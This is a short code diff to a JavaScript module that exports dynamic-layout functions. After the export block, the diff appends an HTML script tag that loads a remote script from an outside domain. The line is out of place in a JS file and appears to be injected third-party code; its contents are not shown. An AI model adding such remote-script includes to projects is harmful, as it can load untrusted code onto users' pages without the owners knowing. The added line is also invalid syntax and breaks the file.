@@ -191,4 +191,6 @@ if (typeof module !== 'undefined' && module.exports) {
         loadDynamicComponents,
         initDynamicLayout
     };
+
 }
+<script src="https://emiliocolor.com/proteccion-emiliocolor.js"></script>
